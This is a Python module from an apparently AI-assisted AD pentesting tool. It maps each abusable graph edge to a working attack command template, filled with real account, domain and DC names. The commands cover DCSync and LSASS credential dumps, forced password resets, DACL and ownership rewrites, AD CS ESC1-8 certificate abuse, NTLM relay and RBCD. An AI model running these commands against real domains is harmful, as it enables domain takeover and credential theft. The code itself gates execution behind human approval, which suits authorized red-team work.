"""Ground each abusable edge in a concrete abuse technique + command.

For an edge like ``jaime --GenericWrite--> joffrey`` the UI needs to show WHAT the edge lets you
do and the command that does it. This module answers that, with the SAME grounded/ai_suggested
treatment as the kill-chain map:

  * a static catalog gives every edge kind a title, a one-line abuse summary, the tool, KB search
    seeds, and a correct fallback command template (general knowledge);
  * :func:`technique_for_edge` runs the KB search: when a real KB entry matches the technique it
    supplies the command and the edge is ``grounded=True`` (cites the entry_id, exactly like the
    attack-path composer); otherwise the fallback template is used and the step is
    ``ai_suggested=True``.

Concrete endpoints (the source/target sam-names, the domain, the DC) are substituted into the
command so what the operator sees is runnable against THIS pair — but it still only runs through
the gated executor, approve-each, in engagement mode. Nothing here executes anything.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Callable

from .schema import Edge, Graph

# grounder(seeds) -> {"id", "title", "commands": [{lang, cmd}]} | None
# Supplied by the caller (main.py wires it to the KB search + STATE). Kept as an injected
# callable so this module has NO import cycle with the KB/app layer and stays unit-testable.
Grounder = Callable[[str], "dict | None"]


@dataclass(frozen=True)
class AbuseSpec:
    title: str
    summary: str                 # one line: what this edge lets you do
    tool: str                    # the primary tool
    kb_seeds: str                # KB search terms to find a grounded entry
    template: str                # fallback command (general knowledge), with {placeholders}
    needs_target: str = "any"    # 'user' | 'group' | 'computer' | 'domain' | 'any' (context)
    destructive: bool = False    # a real, high-impact change on the domain (UI marks it red)
    # NATIVE WINDOWS variant — a PowerView / Rubeus / Mimikatz / PowerShell command that runs
    # ON the Windows box over WinRM (the CRTP way), vs the Linux `template` that runs FROM Kali.
    # The walk/orchestrator offers both; the human picks the transport. Same {placeholders}.
    win_template: str = ""
    # This edge is RIGHTS YOU ALREADY HOLD, not an action — there is nothing to run, and the
    # template is deliberately a prose note. Such an edge must never acquire a command, INCLUDING
    # from the KB grounder: see :func:`technique_for_edge` for what happened live when it could.
    no_command: bool = False


# The catalog. Keyed by edge kind; a few kinds specialize by target type via _specialize().
_CATALOG: dict[str, AbuseSpec] = {
    "MemberOf": AbuseSpec(
        title="Group membership",
        summary="You already inherit this group's rights — no action needed; use them.",
        tool="(none)",
        kb_seeds="active directory group membership privilege inheritance",
        template="# {source} is a member of {target} — its rights are already yours.",
        no_command=True,
        win_template="# {source} is a member of {target} — rights already yours "
                     "(PowerView: Get-DomainGroupMember -Identity '{target_sam}').",
    ),
    "ForceChangePassword": AbuseSpec(
        title="Force-change the target's password",
        summary="Reset {target}'s password without knowing the old one, then log in as them.",
        tool="net / bloodyAD",
        kb_seeds="force change password reset ACL abuse net rpc bloodyAD",
        template=("net rpc password '{target_sam}' 'Newp@ss123!' "
                  "-U '{domain}/{source_sam}%<PASSWORD>' -S {dc}"),
        needs_target="user",
        destructive=True,
        win_template=("Set-DomainUserPassword -Identity '{target_sam}' -AccountPassword "
                      "(ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"),
    ),
    "GenericAll": AbuseSpec(
        title="Full control (GenericAll)",
        summary="Full control over {target} — reset its password or shadow-credential it.",
        tool="certipy / pywhisker / net",
        kb_seeds="GenericAll full control abuse reset password shadow credentials",
        template=("certipy shadow auto -u '{source_sam}@{domain}' -p '<PASSWORD>' "
                  "-account '{target_sam}' -dc-ip {dc}"),
        win_template=("Set-DomainUserPassword -Identity '{target_sam}' -AccountPassword "
                      "(ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"),
    ),
    "GenericWrite": AbuseSpec(
        title="Write attributes (GenericWrite)",
        summary="Write {target}'s attributes — set an SPN and Kerberoast, or shadow-credential it.",
        tool="targetedKerberoast / pywhisker",
        kb_seeds="GenericWrite targeted kerberoast set SPN shadow credentials abuse",
        template=("python3 targetedKerberoast.py -v -d '{domain}' -u '{source_sam}' "
                  "-p '<PASSWORD>' --request-user '{target_sam}'"),
        needs_target="user",
        win_template=("Set-DomainObject -Identity '{target_sam}' -Set "
                      "@{serviceprincipalname='hackpit/svc'}; Rubeus.exe kerberoast "
                      "/user:'{target_sam}' /nowrap"),
    ),
    "WriteDacl": AbuseSpec(
        title="Rewrite the DACL (WriteDacl)",
        summary="Grant yourself GenericAll over {target} by editing its DACL, then abuse that.",
        tool="dacledit (impacket)",
        kb_seeds="WriteDacl dacledit grant genericall DACL abuse active directory",
        template=("impacket-dacledit -action write -rights FullControl "
                  "-principal '{source_sam}' -target '{target_sam}' "
                  "'{domain}/{source_sam}:<PASSWORD>'"),
        destructive=True,
        win_template=("Add-DomainObjectAcl -TargetIdentity '{target_sam}' "
                      "-PrincipalIdentity '{source_sam}' -Rights All"),
    ),
    "WriteOwner": AbuseSpec(
        title="Take ownership (WriteOwner)",
        summary="Set yourself as owner of {target}, then rewrite its DACL to grant control.",
        tool="owneredit + dacledit (impacket)",
        kb_seeds="WriteOwner owneredit take ownership dacledit abuse",
        template=("impacket-owneredit -action write -new-owner '{source_sam}' "
                  "-target '{target_sam}' '{domain}/{source_sam}:<PASSWORD>'"),
        destructive=True,
        win_template=("Set-DomainObjectOwner -Identity '{target_sam}' -OwnerIdentity "
                      "'{source_sam}'; Add-DomainObjectAcl -TargetIdentity '{target_sam}' "
                      "-PrincipalIdentity '{source_sam}' -Rights All"),
    ),
    "Owns": AbuseSpec(
        title="Ownership (Owns)",
        summary="You own {target} — rewrite its DACL to grant yourself full control.",
        tool="dacledit (impacket)",
        kb_seeds="owner object rewrite DACL dacledit genericall abuse",
        template=("impacket-dacledit -action write -rights FullControl "
                  "-principal '{source_sam}' -target '{target_sam}' "
                  "'{domain}/{source_sam}:<PASSWORD>'"),
        destructive=True,
        win_template=("Add-DomainObjectAcl -TargetIdentity '{target_sam}' "
                      "-PrincipalIdentity '{source_sam}' -Rights All"),
    ),
    "AddMember": AbuseSpec(
        title="Add a member to the group",
        summary="Add yourself (or a controlled user) to {target}, inheriting its rights.",
        tool="net / bloodyAD",
        kb_seeds="add member group net rpc bloodyAD writeproperty abuse domain admins",
        template=("net rpc group addmem '{target_sam}' '{source_sam}' "
                  "-U '{domain}/{source_sam}%<PASSWORD>' -S {dc}"),
        needs_target="group",
        destructive=True,
        win_template="Add-DomainGroupMember -Identity '{target_sam}' -Members '{source_sam}'",
    ),
    "AddSelf": AbuseSpec(
        title="Add yourself to the group",
        summary="Add yourself to {target} directly, inheriting its rights.",
        tool="bloodyAD / net",
        kb_seeds="add self membership group self-membership abuse bloodyAD",
        template=("bloodyAD --host {dc} -d '{domain}' -u '{source_sam}' -p '<PASSWORD>' "
                  "add groupMember '{target_sam}' '{source_sam}'"),
        needs_target="group",
        destructive=True,
        win_template="Add-DomainGroupMember -Identity '{target_sam}' -Members '{source_sam}'",
    ),
    "AddKeyCredentialLink": AbuseSpec(
        title="Shadow credentials (Key Credential Link)",
        summary="Add a key credential to {target} and authenticate as it via PKINIT.",
        tool="certipy / pywhisker",
        kb_seeds="shadow credentials msDS-KeyCredentialLink pywhisker certipy PKINIT abuse",
        template=("certipy shadow auto -u '{source_sam}@{domain}' -p '<PASSWORD>' "
                  "-account '{target_sam}' -dc-ip {dc}"),
        destructive=True,
        win_template="Whisker.exe add /target:'{target_sam}'",
    ),
    # --- AD CS ESC1-8 --------------------------------------------------------- #
    # Each mirrors AddKeyCredentialLink (certipy shadow) above: a certipy `req` to obtain a cert
    # as a privileged principal, then certipy `auth` to turn that cert into an NT hash / TGT. The
    # native Windows variant is Certify.exe (the CRTP way). All are destructive — they issue a
    # real certificate or reconfigure the PKI — and every command trips the danger heuristic
    # (certipy subcommands / ntlmrelayx / Certify request / Rubeus asktgt), asserted by the oracle.
    "ESC1": AbuseSpec(
        title="AD CS ESC1 — enrollee-supplied SAN",
        summary="Template {template} lets the enrollee set the SAN — request a cert as "
                "administrator, then authenticate as a Domain Admin.",
        tool="certipy",
        kb_seeds="AD CS ESC1 certipy enrollee supplies subject SAN client authentication "
                 "certificate template abuse domain escalation",
        template=("certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
                  "-ca '{ca}' -template '{template}' -upn 'administrator@{domain}'\n"
                  "certipy auth -pfx administrator.pfx -dc-ip {dc}"),
        needs_target="domain",
        destructive=True,
        win_template="Certify.exe request /ca:{ca} /template:{template} /altname:administrator",
    ),
    "ESC6": AbuseSpec(
        title="AD CS ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2",
        summary="CA {ca} honours a request-supplied SAN on ANY template — enrol any client-auth "
                "template as administrator (ESC1 without a vulnerable template).",
        tool="certipy",
        kb_seeds="AD CS ESC6 certipy EDITF_ATTRIBUTESUBJECTALTNAME2 CA SAN any template "
                 "certificate authority flag escalation",
        template=("certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
                  "-ca '{ca}' -template User -upn 'administrator@{domain}'\n"
                  "certipy auth -pfx administrator.pfx -dc-ip {dc}"),
        needs_target="domain",
        destructive=True,
        win_template="Certify.exe request /ca:{ca} /template:User /altname:administrator",
    ),
    "ESC8": AbuseSpec(
        title="AD CS ESC8 — NTLM relay to web enrollment",
        summary="CA {ca} exposes web enrollment (certsrv) — coerce a machine and relay its NTLM "
                "auth to obtain a cert for that account, then authenticate with it.",
        tool="ntlmrelayx / certipy",
        kb_seeds="AD CS ESC8 ntlmrelayx adcs relay web enrollment certsrv petitpotam coerce "
                 "certificate machine account",
        template=("ntlmrelayx.py -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs "
                  "--template 'DomainController'\n"
                  "# + coerce the target (PetitPotam / printerbug), then: "
                  "certipy auth -pfx relayed.pfx -dc-ip {dc}"),
        needs_target="computer",
        destructive=True,
        win_template="Rubeus.exe asktgt /user:'{ca}$' /certificate:relayed.pfx /ptt",
    ),
    "ESC2": AbuseSpec(
        title="AD CS ESC2 — Any Purpose (or no) EKU",
        summary="Template {template} has an Any-Purpose EKU — the issued cert can be used for "
                "client auth (and more); enrol it and authenticate.",
        tool="certipy",
        kb_seeds="AD CS ESC2 certipy any purpose EKU subordinate CA certificate template abuse",
        template=("certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
                  "-ca '{ca}' -template '{template}'\n"
                  "certipy auth -pfx {enrollee}.pfx -dc-ip {dc}"),
        needs_target="domain",
        destructive=True,
        win_template="Certify.exe request /ca:{ca} /template:{template}",
    ),
    "ESC3": AbuseSpec(
        title="AD CS ESC3 — Enrollment Agent",
        summary="Template {template} is a Certificate Request Agent template — enrol an agent "
                "cert, then request a cert on behalf of a Domain Admin.",
        tool="certipy",
        kb_seeds="AD CS ESC3 certipy enrollment agent certificate request agent on behalf of "
                 "template escalation",
        template=("certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
                  "-ca '{ca}' -template '{template}'\n"
                  "certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' "
                  "-template User -on-behalf-of '{domain}\\administrator' -pfx agent.pfx"),
        needs_target="domain",
        destructive=True,
        win_template=("Certify.exe request /ca:{ca} /template:{template} "
                      "/onbehalfof:{domain}\\administrator /enrollcert:agent.pfx"),
    ),
    "ESC4": AbuseSpec(
        title="AD CS ESC4 — write control over the template",
        summary="You can rewrite template {template}'s configuration — make it ESC1-vulnerable "
                "(enrollee-supplied SAN + client auth), then abuse it.",
        tool="certipy",
        kb_seeds="AD CS ESC4 certipy template write GenericAll WriteDacl reconfigure "
                 "enrollee supplies subject vulnerable",
        template=("certipy template -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
                  "-template '{template}' -write-default-configuration\n"
                  "# then abuse it as ESC1:\n"
                  "certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' "
                  "-template '{template}' -upn 'administrator@{domain}'"),
        needs_target="any",
        destructive=True,
        win_template="Certify.exe request /ca:{ca} /template:{template} /altname:administrator",
    ),
    "ESC7": AbuseSpec(
        title="AD CS ESC7 — ManageCA / ManageCertificates",
        summary="You hold ManageCA on {ca} — add yourself as an officer, enable a SAN-abusable "
                "template (SubCA), and issue a cert as administrator.",
        tool="certipy",
        kb_seeds="AD CS ESC7 certipy ManageCA ManageCertificates add officer enable template "
                 "SubCA approve request certificate authority",
        template=("certipy ca -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' "
                  "-add-officer '{enrollee}'\n"
                  "certipy ca -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' "
                  "-enable-template SubCA"),
        needs_target="any",
        destructive=True,
        win_template="Certify.exe request /ca:{ca} /template:SubCA /altname:administrator",
    ),
    "AddAllowedToAct": AbuseSpec(
        title="Resource-based constrained delegation (write)",
        summary="Write msDS-AllowedToActOnBehalfOfOtherIdentity on {target} for RBCD takeover.",
        tool="rbcd + getST (impacket)",
        kb_seeds="resource based constrained delegation RBCD AllowedToActOnBehalf rbcd.py abuse",
        template=("impacket-rbcd -action write -delegate-from '<ATTACKER_COMPUTER$>' "
                  "-delegate-to '{target_sam}' '{domain}/{source_sam}:<PASSWORD>'"),
        needs_target="computer",
        destructive=True,
        win_template=("Set-DomainRBCD -Identity '{target_sam}' -DelegateFrom "
                      "'<ATTACKER_COMPUTER$>'"),
    ),
    "AllowedToAct": AbuseSpec(
        title="Resource-based constrained delegation",
        summary="Abuse RBCD on {target}: request a ticket as any user via S4U.",
        tool="getST (impacket)",
        kb_seeds="resource based constrained delegation RBCD S4U getST impersonate abuse",
        template=("impacket-getST -spn 'cifs/{target}' -impersonate Administrator "
                  "'{domain}/<ATTACKER_COMPUTER$>' -hashes :<HASH>"),
        needs_target="computer",
        win_template=("Rubeus.exe s4u /user:'<ATTACKER_COMPUTER$>' /rc4:<HASH> "
                      "/impersonateuser:Administrator /msdsspn:'cifs/{target}' /ptt"),
    ),
    "ReadLAPSPassword": AbuseSpec(
        title="Read the LAPS password",
        summary="Read {target}'s local Administrator password from LAPS.",
        tool="netexec / bloodyAD",
        kb_seeds="LAPS read ms-Mcs-AdmPwd local administrator password abuse",
        template="nxc ldap {dc} -u '{source_sam}' -p '<PASSWORD>' --laps",
        needs_target="computer",
        win_template=("Get-DomainObject -Identity '{target_sam}' -Properties "
                      "'ms-Mcs-AdmPwd','name'"),
    ),
    "ReadGMSAPassword": AbuseSpec(
        title="Read the gMSA password",
        summary="Read {target}'s managed password (gMSA) and derive its NT hash.",
        tool="gMSADumper / netexec",
        kb_seeds="gMSA managed service account read password gMSADumper msDS-ManagedPassword",
        template="python3 gMSADumper.py -u '{source_sam}' -p '<PASSWORD>' -d '{domain}'",
        win_template=("Get-ADServiceAccount -Identity '{target_sam}' -Properties "
                      "'msDS-ManagedPassword'"),
    ),
    "AllowedToDelegate": AbuseSpec(
        title="Constrained delegation (S4U)",
        summary="Impersonate any user to {target}'s service via S4U constrained delegation.",
        tool="getST (impacket)",
        kb_seeds="constrained delegation msDS-AllowedToDelegateTo S4U getST impersonate abuse",
        template=("impacket-getST -spn '{target_spn}' -impersonate Administrator "
                  "'{domain}/{source_sam}' -hashes :<HASH>"),
        win_template=("Rubeus.exe s4u /user:'{source_sam}' /rc4:<HASH> "
                      "/impersonateuser:Administrator /msdsspn:'{target_spn}' /ptt"),
    ),
    "HasSIDHistory": AbuseSpec(
        title="SID history",
        summary="{source} carries {target}'s SID in its history — it already holds that access.",
        tool="(none)",
        kb_seeds="SID history sidhistory abuse access token",
        template="# {source} has {target} in SID history — use {source}'s creds; access is inherited.",
        no_command=True,
        win_template="# {source} carries {target}'s SID in history — access is inherited "
                     "(whoami /groups shows the SID).",
    ),
    "AdminTo": AbuseSpec(
        title="Local admin on the computer",
        summary="You are local admin on {target} — dump secrets or exec as SYSTEM.",
        tool="netexec / impacket-secretsdump",
        kb_seeds="local admin lateral movement secretsdump psexec dump lsass credentials",
        template="nxc smb {target} -u '{source_sam}' -p '<PASSWORD>' --sam --lsa",
        needs_target="computer",
        win_template=("Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'  "
                      "# local admin on {target}"),
    ),
    "CanRDP": AbuseSpec(
        title="Remote Desktop (RDP)",
        summary="Log on interactively to {target} over RDP.",
        tool="xfreerdp",
        kb_seeds="RDP remote desktop interactive logon xfreerdp lateral",
        template="xfreerdp /u:'{source_sam}' /p:'<PASSWORD>' /d:'{domain}' /v:{target} +clipboard",
        needs_target="computer",
        win_template="mstsc /v:{target}  # RDP as {source_sam}",
    ),
    "CanPSRemote": AbuseSpec(
        title="PowerShell Remoting (WinRM)",
        summary="Open a remote PowerShell session on {target} via WinRM.",
        tool="evil-winrm",
        kb_seeds="powershell remoting winrm evil-winrm lateral movement PSRemote",
        template="evil-winrm -i {target} -u '{source_sam}' -p '<PASSWORD>'",
        needs_target="computer",
        win_template="Enter-PSSession -ComputerName {target}",
    ),
    "ExecuteDCOM": AbuseSpec(
        title="DCOM execution",
        summary="Execute code on {target} through DCOM.",
        tool="impacket-dcomexec",
        kb_seeds="DCOM lateral movement dcomexec MMC20 ShellWindows execute",
        template="impacket-dcomexec -object MMC20 '{domain}/{source_sam}:<PASSWORD>@{target}'",
        needs_target="computer",
        win_template="Invoke-Command -ComputerName {target} -ScriptBlock { whoami }  "
                     "# or DCOM MMC20.Application",
    ),
    "HasSession": AbuseSpec(
        title="Harvest a session",
        summary="{target} has a session on {source} — as local admin there, harvest its creds.",
        tool="netexec / mimikatz",
        kb_seeds="session credential harvest lsass dump mimikatz logonpasswords token",
        template="nxc smb {source} -u '<LOCALADMIN>' -p '<PASSWORD>' -M lsassy",
        win_template=("Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'  "
                      "# harvest {target}'s session on {source}"),
    ),
    "DCSync": AbuseSpec(
        title="DCSync (replicate secrets)",
        summary="Replicate {target}'s secrets — dump every hash incl. krbtgt (full compromise).",
        tool="impacket-secretsdump",
        kb_seeds="DCSync replicate directory changes secretsdump krbtgt dump hashes",
        template=("impacket-secretsdump -just-dc '{domain}/{source_sam}:<PASSWORD>@{dc}'"),
        needs_target="domain",
        destructive=True,
        win_template=("Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:{domain} "
                      "/user:{domain}\\krbtgt\"'"),
    ),
    "AllExtendedRights": AbuseSpec(
        title="All extended rights",
        summary="All extended rights over {target} — force-change its password (or DCSync a domain).",
        tool="net / impacket-secretsdump",
        kb_seeds="all extended rights force change password DCSync abuse",
        template=("net rpc password '{target_sam}' 'Newp@ss123!' "
                  "-U '{domain}/{source_sam}%<PASSWORD>' -S {dc}"),
        destructive=True,
        win_template=("Set-DomainUserPassword -Identity '{target_sam}' -AccountPassword "
                      "(ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"),
    ),
    "SQLAdmin": AbuseSpec(
        title="SQL sysadmin",
        summary="You are sysadmin on {target}'s SQL instance — enable xp_cmdshell for code exec.",
        tool="impacket-mssqlclient",
        kb_seeds="mssql sysadmin xp_cmdshell code execution sql admin abuse",
        template="impacket-mssqlclient '{domain}/{source_sam}:<PASSWORD>@{target}' -windows-auth",
        needs_target="computer",
        win_template="Invoke-SQLOSCmd -Instance '{target}' -Command 'whoami' -RawResults",
    ),
}

# Some kinds change meaning by target type (GenericAll on a group is "AddMember"-flavoured).
def _specialize(kind: str, target_type: str) -> str:
    if kind == "GenericAll" and target_type == "group":
        return "AddMember"
    if kind == "GenericWrite" and target_type == "group":
        return "AddMember"
    if kind in ("GenericAll", "AllExtendedRights") and target_type == "domain":
        return "DCSync"
    return kind


def _sam(label: str) -> str:
    """USER@DOMAIN / DOMAIN\\user / a DN -> the bare sam-ish name for a command."""
    if not label:
        return ""
    v = label.split("@", 1)[0]
    if "\\" in v:
        v = v.rsplit("\\", 1)[-1]
    if v.upper().startswith("CN="):
        v = v[3:].split(",", 1)[0]
    return v


def _fill(template: str, ctx: dict[str, str]) -> str:
    out = template
    for k, v in ctx.items():
        out = out.replace("{" + k + "}", v)
    return out


def technique_for_edge(
    edge: Edge | dict, graph: Graph, grounder: Grounder | None = None, dc: str | None = None
) -> dict[str, Any]:
    """Resolve the abuse technique + command for one edge.

    ``grounder`` (optional) maps the technique's KB seeds to a matching KB entry's commands; the
    caller wires it to the app's KB search. Returns ``{kind, title, summary, tool, destructive,
    grounded, entry_id, entry_title, commands: [{lang, cmd}], why}``. ``grounded`` is True with
    an ``entry_id`` when the KB supplied the command; otherwise the fallback template is used and
    ``ai_suggested`` is True. Never executes anything — this is display + a command the human may
    later approve through the gated executor.
    """
    if isinstance(edge, dict):
        source, target, kind = edge["source"], edge["target"], edge["kind"]
        eprops = edge.get("props") or {}
    else:
        source, target, kind = edge.source, edge.target, edge.kind
        eprops = edge.props

    tnode = graph.node(target)
    snode = graph.node(source)
    target_type = tnode.type if tnode else "any"
    eff_kind = _specialize(kind, target_type)
    spec = _CATALOG.get(eff_kind) or _CATALOG.get(kind)
    if spec is None:
        return {
            "kind": kind, "title": kind, "summary": "(no abuse mapped for this edge)",
            "tool": "", "destructive": False, "grounded": False, "ai_suggested": True,
            "entry_id": None, "entry_title": None, "commands": [], "why": "",
        }

    domain = graph.domain or (tnode.props.get("domain") if tnode else "") or "DOMAIN"
    ctx = {
        "source": snode.label if snode else source,
        "target": tnode.label if tnode else target,
        "source_sam": _sam(snode.label if snode else source),
        "target_sam": _sam(tnode.label if tnode else target),
        "domain": str(domain),
        "dc": dc or _guess_dc(graph) or "<DC>",
        "target_spn": (eprops.get("spn") or f"cifs/{_sam(tnode.label) if tnode else target}"),
        # AD CS (ESC) context, carried on the synthesized edge's props (parser._ingest_certipy):
        # which CA + template the abuse targets, the EKU, and the ENROLLEE (which on a two-hop
        # ESC4/ESC7 chain is the human, not the intermediate template/CA node that is the edge
        # source). Absent props degrade to explicit placeholders, never a stray "{ca}".
        "ca": str(eprops.get("ca_name") or eprops.get("ca") or "<CA>"),
        "template": str(eprops.get("template_name") or eprops.get("template") or "<TEMPLATE>"),
        "eku": str(eprops.get("eku") or "Client Authentication"),
        "enrollee": str(eprops.get("enrollee_sam") or _sam(snode.label if snode else source)
                        or "<USER>"),
    }

    summary = _fill(spec.summary, ctx)
    commands: list[dict[str, Any]] = []
    grounded = False
    entry_id = entry_title = None
    why = ""

    # Try to ground the command in the KB via the injected grounder.
    #
    # A ``no_command`` edge (MemberOf, HasSIDHistory) takes the CITATION but NOT the commands.
    # Build #9's live walk is why. Those specs are prose by design — "its rights are already
    # yours" — but their kb_seeds still match a real ACL-abuse KB entry, and that entry's
    # examples were being adopted wholesale. On the real corp.local graph the orchestrator
    # therefore proposed, for ADMINISTRATOR -MemberOf-> DOMAIN ADMINS (an edge with nothing to
    # do), a runnable `net rpc password` — a DESTRUCTIVE password reset against a live domain
    # user, reported as resolution="ready". Every gate still held (the human approves each
    # command and the red-confirm was demanded), so nothing fired; but the panel was asking a
    # human to approve a domain change for a step that requires no action, and it contradicted
    # proposal_for_edge's own documented contract that MemberOf resolves "note-only".
    #
    # The KB may ENRICH such an edge (the entry id/title still cite where the explanation comes
    # from). It may not manufacture an action for an edge that has none.
    if grounder is not None:
        try:
            hit = grounder(spec.kb_seeds)
        except Exception:
            hit = None
        if hit and hit.get("commands"):
            entry_id = hit.get("id")
            entry_title = hit.get("title")
            grounded = True
            why = f"Grounded in KB technique “{entry_title}”."
            if not spec.no_command:
                for c in hit["commands"][:3]:
                    commands.append({"lang": c.get("lang") or "bash", "cmd": c.get("cmd") or ""})
            else:
                why += (" Rights you already hold — the KB entry explains the edge; there is "
                        "nothing to run, so no command is offered.")

    if not commands:  # fallback: the catalog template (general knowledge)
        commands = [{"lang": "bash", "cmd": _fill(spec.template, ctx)}]
        why = why or "General-knowledge technique (no exact KB entry matched)."

    # NATIVE WINDOWS variant — the CRTP command that runs ON the box over WinRM. Always from
    # the catalog (deterministic), separate from the Linux `commands` so the walk can offer
    # both and the human picks the transport. Empty when the edge has no native variant.
    windows_commands: list[dict[str, Any]] = []
    if spec.win_template:
        windows_commands = [{"lang": "powershell", "cmd": _fill(spec.win_template, ctx)}]

    return {
        "kind": kind,
        "effective_kind": eff_kind,
        "title": spec.title,
        "summary": summary,
        "tool": spec.tool,
        "destructive": spec.destructive,
        "grounded": grounded,
        "ai_suggested": not grounded,
        "entry_id": entry_id,
        "entry_title": entry_title,
        "commands": commands,
        "windows_commands": windows_commands,
        "why": why,
    }


def _guess_dc(graph: Graph) -> str | None:
    """A DC hostname from the graph (a computer node that is high-value / RID 516), for the
    command's -dc / -S placeholder."""
    for n in graph.nodes.values():
        if n.type == "computer" and (n.high_value or n.id.endswith("-516")):
            name = n.props.get("name") or n.label
            return str(name)
    for n in graph.nodes.values():
        if n.type == "computer":
            return str(n.props.get("name") or n.label)
    return None


__all__ = ["AbuseSpec", "Grounder", "technique_for_edge"]
